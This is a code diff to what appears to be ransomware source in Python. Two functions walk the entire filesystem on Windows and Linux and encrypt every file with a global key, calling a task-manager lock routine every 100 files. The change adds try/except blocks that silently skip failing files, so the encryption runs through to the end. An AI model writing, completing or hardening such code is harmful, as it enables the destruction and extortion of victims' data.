@@ -4,28 +4,34 @@ import decryption
 import encryption
 import lockTaskManager as lock
 
-
-
 def allFilesW():
     global KEY
     counter = 0
     for root, dirs, files in os.walk('C:\\\\'):
         for directory in files:
-            encryption.file_encryption(os.path.join(root, directory), KEY)
-            counter = counter + 1
-            if counter > 100:
-                lock.update()
-                counter = 0
+            try:
+                encryption.file_encryption(os.path.join(root, directory), KEY)
+                counter = counter + 1
+            except:
+                pass
+            finally:
+                if counter > 100:
+                    lock.update()
+                    counter = 0
 
 def allFilesL():
     counter = 0
     for root, dirs, files in os.walk('/'):
         for directory in files:
-            encryption.file_encryption(os.path.join(root, directory), KEY)
-            counter = counter + 1
-            if counter > 100:
-                lock.update()
-                counter = 0
+            try:
+                encryption.file_encryption(os.path.join(root, directory), KEY)
+                counter = counter + 1
+            except:
+                pass
+            finally:
+                if counter > 100:
+                    lock.update()
+                    counter = 0
 
 def platform_info():
     with open("platform.json", "r") as pl:
